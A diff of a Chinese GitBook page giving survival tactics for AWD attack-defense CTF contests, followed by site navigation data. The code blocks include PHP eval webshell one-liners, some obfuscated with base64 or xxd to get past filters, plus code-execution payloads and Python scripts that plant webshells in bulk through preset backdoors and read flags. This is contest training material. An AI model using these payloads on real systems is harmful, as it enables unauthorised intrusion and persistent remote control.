 </code></pre><p>&#x7F16;&#x5199;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x83B7;&#x53D6;flag&#x5E76;&#x63D0;&#x4EA4;</p>
-<pre class="language-"><code># coding: UTF-8
+<pre><code># coding: UTF-8
 import requests
 import json
 
@@ -4346,23 +4342,23 @@ for url2 in range(8802,8810):
 <h3 id="4&#x5229;&#x7528;&#x540E;&#x95E8;&#x5199;shell">4.&#x5229;&#x7528;&#x540E;&#x95E8;&#x5199;shell</h3>
 <p>&#x9884;&#x7559;&#x540E;&#x95E8;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x8981;&#x60F3;&#x6301;&#x7EED;&#x62FF;&#x5206;&#x9700;&#x8981;&#x5199;shell&#xFF0C;&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x548C;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6765;&#x5199;&#x9A6C;
 <strong>&#x5229;&#x7528;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5199;&#x9A6C;</strong></p>
-<pre class="language-"><code>1.Linux&#x4E0B;&#x5199;shell
-$ echo &quot;<span class="token prolog">&lt;?php @eval(\$_POST[123]); ?&gt;</span>&quot; &gt; webshell.php
+<pre><code>1.Linux&#x4E0B;&#x5199;shell
+$ echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php
 $ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64&#x7F16;&#x7801;&#x7ED5;&#x8FC7;
 $ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxd&#x7ED5;&#x8FC7;
 
 
 2.windows&#x4E0B;&#x5199;shell
-&gt;echo ^<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span> <span class="token attr-name">eval($^_POST[123]);</span> <span class="token attr-name">?^</span><span class="token punctuation">&gt;</span></span> &gt; webshell.php
+&gt;echo ^&lt;?php eval($^_POST[123]); ?^&gt; &gt; webshell.php
 </code></pre><p><strong>&#x5229;&#x7528;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x5199;&#x9A6C;</strong></p>
-<pre class="language-"><code>?code=fputs(fopen(&apos;./webshell.php.php&apos;,&apos;w&apos;),&apos;<span class="token prolog">&lt;?php @eval($_POST[123]);?&gt;</span>&apos;);
+<pre><code>?code=fputs(fopen(&apos;./webshell.php.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[123]);?&gt;&apos;);
 
-?code=file_put_contents(&apos;webshell.php.php&apos;, &apos;<span class="token prolog">&lt;?php @eval($_POST[123]); ?&gt;</span> &apos;);
+?code=file_put_contents(&apos;webshell.php.php&apos;, &apos;&lt;?php @eval($_POST[123]); ?&gt; &apos;);
 
 ?code=file_put_contents($_POST[f], $_POST[d]); 
-post: f=webshell.php&amp;d=<span class="token prolog">&lt;?php @eval($_POST[123]); ?&gt;</span>
+post: f=webshell.php&amp;d=&lt;?php @eval($_POST[123]); ?&gt;
 </code></pre><p>&#x7136;&#x540E;&#x5229;&#x7528;&#x811A;&#x672C;&#x5B9E;&#x73B0;</p>
-<pre class="language-"><code># coding: UTF-8
+<pre><code># coding: UTF-8
 import requests
 
 url = &quot;http://192.168.182.130:8808&quot;
@@ -4377,7 +4373,7 @@ print(res.text)
 
 
 #payload1&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;shell
-payload1 = {shell_passwd: &apos;system(\&apos;echo &quot;<span class="token prolog">&lt;?php @eval(\$_POST[atkx]);?&gt;</span>&quot; &gt; /var/www/html/atkx.php\&apos;);&apos;}
+payload1 = {shell_passwd: &apos;system(\&apos;echo &quot;&lt;?php @eval(\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx.php\&apos;);&apos;}
 res = requests.post(shell_path, payload1)
 print(&quot;shell&#x5DF2;&#x4E0A;&#x4F20;&quot;)
 
@@ -4388,7 +4384,7 @@ payload2 = {my_shell_passwd: &apos;system(\&apos;cat /f*\&apos;);&apos;}
 res = requests.post(my_shell_path, payload2)
 print(res.text)
 </code></pre><p>&#x6279;&#x91CF;&#x540E;&#x95E8;&#x5199;shell</p>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 
 url_head=&quot;http://192.168.182.130&quot;
 for url2 in range(8801,8805):
@@ -4400,7 +4396,7 @@ for url2 in range(8801,8805):
         print(shell_path)
 
         #payload1&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;shell
-        payload1 = {shell_passwd: &apos;system(\&apos;echo &quot;<span class="token prolog">&lt;?php @eval(\$_POST[atkx]);?&gt;</span>&quot; &gt; /var/www/html/atkx1.php\&apos;);&apos;}
+        payload1 = {shell_passwd: &apos;system(\&apos;echo &quot;&lt;?php @eval(\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx1.php\&apos;);&apos;}
         res = requests.post(shell_path, payload1)
         print(url + &quot; shell&#x5199;&#x5165;&#x6210;&#x529F;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&quot;)
         #
@@ -4424,8 +4420,8 @@ for url2 in range(8801,8805):
 <a href="https://www.likecs.com/show-306005446.html" target="_blank">https://www.likecs.com/show-306005446.html</a>
 <a href="https://www.anquanke.com/post/id/86984" target="_blank">https://www.anquanke.com/post/id/86984</a>
 <a href="https://xz.aliyun.com/t/10995" target="_blank">https://xz.aliyun.com/t/10995</a> </p>
-<footer class="page-footer"><span class="copyright">&#x8D63;ICP&#x5907;2023008387&#x53F7;-1 &#x8D63;&#x516C;&#x7F51;&#x5B89;&#x5907;36052102100040&#x53F7; Copyright &#xA9;2022 - 2024 By Feiyu</span><span class="footer-modification">&#x6700;&#x8FD1;&#x4E00;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#xFF1A;
-2024-11-15 21:49
+<footer class="page-footer"><span class="copyright">&#x8D63;ICP&#x5907;2023008387&#x53F7;-1 &#x8D63;&#x516C;&#x7F51;&#x5B89;&#x5907;36052102100040&#x53F7; Copyright &#xA9;2022 - 2024 By Feiyu all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6700;&#x8FD1;&#x4E00;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#xFF1A;
+2025-04-06 16:47
 </span></footer>
                                 
                                 </section>
@@ -4465,7 +4461,7 @@ for url2 in range(8801,8805):
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"浅谈AWD攻防赛的生存攻略","date":"2024-09-25T14:30:33.000Z","updated":"2024-11-15T21:49:39.000Z","categories":["网络安全","AWD"],"tags":["AWD","网络安全"],"permalink":"/posts/浅谈AWD攻防赛的生存攻略/","level":"1.4.1.11","depth":3,"next":{"title":"CTF竞赛","level":"1.4.2","depth":2,"ref":"","articles":[{"title":"蓝桥杯","level":"1.4.2.1","depth":3,"ref":"","articles":[{"title":"Crypto","level":"1.4.2.1.1","depth":4,"ref":"","articles":[{"title":"Backdoor","level":"1.4.2.1.1.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.md","articles":[]},{"title":"Classical","level":"1.4.2.1.1.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/classical.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/classical.md","articles":[]},{"title":"Cyber Chef","level":"1.4.2.1.1.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.md","articles":[]},{"title":"Cyber Chef 2","level":"1.4.2.1.1.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.md","articles":[]},{"title":"RSA","level":"1.4.2.1.1.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.md","articles":[]},{"title":"基于国密SM2算法的密钥密文分发","level":"1.4.2.1.1.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.md","articles":[]}]},{"title":"Misc","level":"1.4.2.1.2","depth":4,"ref":"","articles":[{"title":"58与64","level":"1.4.2.1.2.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/58与64.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/58与64.md","articles":[]},{"title":"AdvDetPatch（未完成）","level":"1.4.2.1.2.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.md","articles":[]},{"title":"Blue Monday","level":"1.4.2.1.2.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.md","articles":[]},{"title":"Classica 10","level":"1.4.2.1.2.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.md","articles":[]},{"title":"Easy Crack Me","level":"1.4.2.1.2.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.md","articles":[]},{"title":"Embarrass","level":"1.4.2.1.2.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.md","articles":[]},{"title":"Find The Flag","level":"1.4.2.1.2.7","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.md","articles":[]},{"title":"Flooding","level":"1.4.2.1.2.8","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/flooding.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/flooding.md","articles":[]},{"title":"Happy 2 Forensics","level":"1.4.2.1.2.9","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.md","articles":[]},{"title":"Matrix","level":"1.4.2.1.2.10","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.md","articles":[]},{"title":"Piphack","level":"1.4.2.1.2.11","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/piphack.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/piphack.md","articles":[]},{"title":"Puzzle","level":"1.4.2.1.2.12","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.md","articles":[]},{"title":"Py Ha Ha","level":"1.4.2.1.2.13","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/PyHaHa.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/PyHaHa.md","articles":[]},{"title":"Pyshell","level":"1.4.2.1.2.14","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/pyshell.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/pyshell.md","articles":[]},{"title":"Random","level":"1.4.2.1.2.15","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Random.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Random.md","articles":[]},{"title":"Re Creators","level":"1.4.2.1.2.16","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/ReCreators.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/ReCreators.md","articles":[]},{"title":"SCAN","level":"1.4.2.1.2.17","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/SCAN.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/SCAN.md","articles":[]},{"title":"Shellcode","level":"1.4.2.1.2.18","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/shellcode.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/shellcode.md","articles":[]},{"title":"Warning","level":"1.4.2.1.2.19","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Warning.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Warning.md","articles":[]},{"title":"Wordle","level":"1.4.2.1.2.20","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Wordle.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Wordle.md","articles":[]},{"title":"ZIP","level":"1.4.2.1.2.21","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/ZIP.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/ZIP.md","articles":[]},{"title":"传感器1","level":"1.4.2.1.2.22","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器1.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器1.md","articles":[]},{"title":"传感器2","level":"1.4.2.1.2.23","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器2.md","articles":[]},{"title":"古典密码","level":"1.4.2.1.2.24","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/古典密码.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/古典密码.md","articles":[]},{"title":"小苹果","level":"1.4.2.1.2.25","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/小苹果.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/小苹果.md","articles":[]},{"title":"小试身手","level":"1.4.2.1.2.26","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/小试身手.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/小试身手.md","articles":[]},{"title":"段子","level":"1.4.2.1.2.27","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/段子.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/段子.md","articles":[]},{"title":"登机牌","level":"1.4.2.1.2.28","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/登机牌.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/登机牌.md","articles":[]},{"title":"盲人隐藏了起来","level":"1.4.2.1.2.29","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/盲人隐藏了起来.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/盲人隐藏了起来.md","articles":[]},{"title":"签到卡","level":"1.4.2.1.2.30","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","articles":[]},{"title":"蚁剑流量","level":"1.4.2.1.2.31","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.md","articles":[]},{"title":"被加密的生产流量","level":"1.4.2.1.2.32","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","articles":[]},{"title":"要想会，先学会","level":"1.4.2.1.2.33","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/要想会，先学会.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/要想会，先学会.md","articles":[]}]},{"title":"Reverse","level":"1.4.2.1.3","depth":4,"ref":"","articles":[{"title":"Baby RE","level":"1.4.2.1.3.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/BabyRE.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/BabyRE.md","articles":[]},{"title":"Base 64","level":"1.4.2.1.3.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Base64++.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Base64++.md","articles":[]},{"title":"BWBA","level":"1.4.2.1.3.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/BWBA.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/BWBA.md","articles":[]},{"title":"Crack Me 01","level":"1.4.2.1.3.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe01.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe01.md","articles":[]},{"title":"Crack Me 02","level":"1.4.2.1.3.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe02.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe02.md","articles":[]},{"title":"Emoji Connect","level":"1.4.2.1.3.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Emoji_Connect.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Emoji_Connect.md","articles":[]},{"title":"Findkey","level":"1.4.2.1.3.7","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/findkey.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/findkey.md","articles":[]},{"title":"Map","level":"1.4.2.1.3.8","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/map.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/map.md","articles":[]},{"title":"Poisoned Tea CHELL","level":"1.4.2.1.3.9","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Poisoned_tea_CHELL.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Poisoned_tea_CHELL.md","articles":[]},{"title":"Pytrans","level":"1.4.2.1.3.10","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Pytrans.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Pytrans.md","articles":[]},{"title":"RC 4","level":"1.4.2.1.3.11","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/RC4.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/RC4.md","articles":[]},{"title":"Smali","level":"1.4.2.1.3.12","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Smali.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Smali.md","articles":[]},{"title":"Sum","level":"1.4.2.1.3.13","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/sum.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/sum.md","articles":[]},{"title":"XOR","level":"1.4.2.1.3.14","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/XOR.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/XOR.md","articles":[]},{"title":"填数游戏","level":"1.4.2.1.3.15","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/填数游戏.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/填数游戏.md","articles":[]},{"title":"珍贵资料","level":"1.4.2.1.3.16","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/珍贵资料.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/珍贵资料.md","articles":[]}]},{"title":"Web","level":"1.4.2.1.4","depth":4,"ref":"","articles":[{"title":"Web 01 1","level":"1.4.2.1.4.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web01-1.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web01-1.md","articles":[]},{"title":"Web 01 2","level":"1.4.2.1.4.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web01-2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web01-2.md","articles":[]},{"title":"Web 02","level":"1.4.2.1.4.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web02.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web02.md","articles":[]},{"title":"Web 03 1","level":"1.4.2.1.4.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web03-1.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web03-1.md","articles":[]},{"title":"文件包含绕过","level":"1.4.2.1.4.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/文件包含绕过.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/文件包含绕过.md","articles":[]}]},{"title":"单选题","level":"1.4.2.1.5","depth":4,"path":"网络安全/CTF竞赛/蓝桥杯/单选题.md","ref":"网络安全/CTF竞赛/蓝桥杯/单选题.md","articles":[]},{"title":"多选题","level":"1.4.2.1.6","depth":4,"path":"网络安全/CTF竞赛/蓝桥杯/多选题.md","ref":"网络安全/CTF竞赛/蓝桥杯/多选题.md","articles":[]}]},{"title":"赣育杯","level":"1.4.2.2","depth":3,"ref":"","articles":[{"title":"Areyubot","level":"1.4.2.2.1","depth":4,"path":"网络安全/CTF竞赛/赣育杯/Areyubot.md","ref":"网络安全/CTF竞赛/赣育杯/Areyubot.md","articles":[]},{"title":"勒索病毒","level":"1.4.2.2.2","depth":4,"path":"网络安全/CTF竞赛/赣育杯/勒索病毒.md","ref":"网络安全/CTF竞赛/赣育杯/勒索病毒.md","articles":[]}]}]},"previous":{"title":"服务配置文件探测","level":"1.4.1.10","depth":3,"path":"网络安全/AWD/服务配置文件探测.md","ref":"网络安全/AWD/服务配置文件探测.md","articles":[]},"dir":"ltr"},"config":{"plugins":["theme-comscore","-lunr","-search","search-pro","expandable-chapters","chapter-fold","splitter","github","page-toc-button","back-to-top-button","tbfed-pagefooter","code","accordion","prism","-sharing","sharing-plus","hide-element","umami"],"styles":{},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu","modify_label":"最近一修改时间：","modify_format":"YYYY-MM-DD HH:mm"},"page-treeview":{"copyright":"Copyright &#169; aleen42","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"]},"github":{"url":"https://github.com/feiyu-195"},"umami":{"url":"https://www.feiyunote.cn:30101/random-string.js","website-id":"49159946-a785-4fe1-aaf0-a009bd825d7e"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"theme-comscore":{},"page-toc-button":{"maxTocDepth":2,"minTocSize":2},"back-to-top-button":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"scripts":{},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"SkyFish","language":"zh-hans","gitbook":"*","description":"这是我的简介..."},"file":{"path":"网络安全/AWD/浅谈AWD攻防赛的生存攻略.md","mtime":"2024-11-15T13:49:40.133Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-04-06T08:32:22.121Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"浅谈AWD攻防赛的生存攻略","date":"2024-09-25T14:30:33.000Z","updated":"2024-11-15T21:49:39.000Z","categories":["网络安全","AWD"],"tags":["AWD","网络安全"],"permalink":"/posts/浅谈AWD攻防赛的生存攻略/","level":"1.4.1.11","depth":3,"next":{"title":"CTF竞赛","level":"1.4.2","depth":2,"ref":"","articles":[{"title":"蓝桥杯","level":"1.4.2.1","depth":3,"ref":"","articles":[{"title":"Crypto","level":"1.4.2.1.1","depth":4,"ref":"","articles":[{"title":"Backdoor","level":"1.4.2.1.1.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.md","articles":[]},{"title":"Classical","level":"1.4.2.1.1.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/classical.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/classical.md","articles":[]},{"title":"Cyber Chef","level":"1.4.2.1.1.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.md","articles":[]},{"title":"Cyber Chef 2","level":"1.4.2.1.1.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.md","articles":[]},{"title":"RSA","level":"1.4.2.1.1.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.md","articles":[]},{"title":"基于国密SM2算法的密钥密文分发","level":"1.4.2.1.1.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.md","articles":[]}]},{"title":"Misc","level":"1.4.2.1.2","depth":4,"ref":"","articles":[{"title":"58与64","level":"1.4.2.1.2.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/58与64.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/58与64.md","articles":[]},{"title":"AdvDetPatch（未完成）","level":"1.4.2.1.2.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.md","articles":[]},{"title":"Blue Monday","level":"1.4.2.1.2.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.md","articles":[]},{"title":"Classica 10","level":"1.4.2.1.2.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.md","articles":[]},{"title":"Easy Crack Me","level":"1.4.2.1.2.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.md","articles":[]},{"title":"Embarrass","level":"1.4.2.1.2.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.md","articles":[]},{"title":"Find The Flag","level":"1.4.2.1.2.7","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.md","articles":[]},{"title":"Flooding","level":"1.4.2.1.2.8","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/flooding.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/flooding.md","articles":[]},{"title":"Happy 2 Forensics","level":"1.4.2.1.2.9","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.md","articles":[]},{"title":"Matrix","level":"1.4.2.1.2.10","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.md","articles":[]},{"title":"Piphack","level":"1.4.2.1.2.11","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/piphack.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/piphack.md","articles":[]},{"title":"Puzzle","level":"1.4.2.1.2.12","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.md","articles":[]},{"title":"Py Ha 